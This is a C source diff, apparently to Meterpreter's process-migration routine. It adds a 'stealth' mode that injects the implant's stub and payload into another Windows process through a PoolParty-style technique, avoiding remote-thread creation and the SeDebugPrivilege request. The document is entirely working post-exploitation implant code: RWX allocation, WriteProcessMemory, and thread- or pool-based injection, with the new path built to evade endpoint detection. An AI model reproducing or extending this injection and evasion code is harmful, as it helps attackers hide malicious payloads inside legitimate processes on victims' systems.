@@ -540,6 +540,8 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	MetsrvConfig* config = NULL;
 	DWORD configSize = 0;
 
+	BOOL bStealth = FALSE;
+	DWORD dwProcessAccess;
 	do
 	{
 		response = packet_create_response(packet);
@@ -568,27 +570,34 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s", dwProcessID, dwDestinationArch == 2 ? "x64" : "x86");
 		dprintf("[MIGRATE] Attempting to migrate. PayloadLength=%d StubLength=%d", dwPayloadLength, dwMigrateStubLength);
 
-		// If we can, get SeDebugPrivilege...
-		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-		{
-			TOKEN_PRIVILEGES priv = { 0 };
+		bStealth = support_stealth_injection(dwDestinationArch);
 
-			priv.PrivilegeCount = 1;
-			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+		if(!bStealth) {
+			if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 			{
-				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
-				{
-					dprintf("[MIGRATE] Got SeDebugPrivilege!");
-				}
-			}
+				TOKEN_PRIVILEGES priv = { 0 };
 
-			CloseHandle(hToken);
+				priv.PrivilegeCount = 1;
+				priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+				if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+				{
+					if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
+					{
+						dprintf("[MIGRATE] Got SeDebugPrivilege!");
+					}
+				}
+
+				CloseHandle(hToken);
+			}
+		}
+		dwProcessAccess = PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
+		if (!bStealth) {
+			dwProcessAccess |= PROCESS_CREATE_THREAD;
 		}
 
-		// Open the process so that we can migrate into it
-		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
+		hProcess = OpenProcess(dwProcessAccess, FALSE, dwProcessID);
+
 		if (!hProcess)
 		{
 			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
@@ -630,6 +639,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		dprintf("[MIGRATE] Duplicated Event Handle: 0x%x", (UINT_PTR)ctx->e.hEvent);
 
+
 		// Allocate memory for the migrate stub, context, payload and configuration block
 		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpMemory)
@@ -639,7 +649,6 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		// Calculate the address of the payload...
 		ctx->p.lpPayload = lpMemory + dwMigrateStubLength + ctxSize;
-
 		// Write the migrate stub to memory...
 		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
 		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
@@ -670,18 +679,25 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		free(ctx);
 
-		// First we try to migrate by directly creating a remote thread in the target process
-		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
-		{
-			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");
-
-			// If that fails we can try to migrate via a queued APC in the target process
-			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
+		if (!bStealth) {
+			// First we try to migrate by directly creating a remote thread in the target process
+			if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 			{
-				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed");
+				dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");
+
+				// If that fails we can try to migrate via a queued APC in the target process
+				if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
+				{
+					BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed");
+				}
 			}
 		}
-
+		else {
+			if (inject_via_poolparty(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
+			{
+				BREAK_ON_ERROR("[MIGRATE] inject_via_poolparty failed");
+			}
+		}
 		dwResult = ERROR_SUCCESS;
 
 	} while (0);
